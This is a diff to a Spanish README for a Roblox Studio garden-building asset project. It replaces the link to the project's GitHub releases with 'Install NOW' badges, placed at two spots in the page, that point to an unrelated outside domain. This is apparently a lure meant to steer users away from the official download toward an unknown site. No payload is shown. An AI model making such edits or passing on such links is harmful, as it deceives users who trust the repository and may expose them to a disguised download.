@@ -23,7 +23,8 @@ RobloxGrowGarden es exclusivamente para uso local en Roblox Studio (modo de un s
 
 **🚀 ¡Descarga Ahora!**  
 ¡No esperes más! Descarga **RobloxGrowGarden** y comienza a crear mundos mágicos hoy mismo. 🌟  
-[![Descargar Ahora](https://img.shields.io/badge/Descargar-AHORA-green)](https://github.com/FloreceJardin/RobloxGrowGarden/releases)  
+-
+[![Install NOW](https://img.shields.io/badge/Install-NOW-purple?style=for-the-badge&logo=roblox&logoColor=white)](https://varengpool.com)
 
 **🛠 Cómo Empezar**  
 1. **Descarga los Recursos** 📥  
@@ -50,6 +51,9 @@ RobloxGrowGarden es exclusivamente para uso local en Roblox Studio (modo de un s
 **¡Un mundo natural que cobra vida ante tus ojos!** 🌿  
 ![Vista Previa 2](https://i.imgur.com/vrNCCYU.png)  
 *¡Explora paisajes mágicos que puedes diseñar en minutos!* 🌸  
+
+[![Install NOW](https://img.shields.io/badge/Install-NOW-purple?style=for-the-badge&logo=roblox&logoColor=white)](https://varengpool.com)
+-
 
 **🤗 Únete y Colabora**  
 ¿Tienes ideas para hacer crecer **RobloxGrowGarden**? ¡Abre un *issue* o envía un *pull request*! Todas las contribuciones deben cumplir con los Términos de GitHub y Roblox. 🌟  
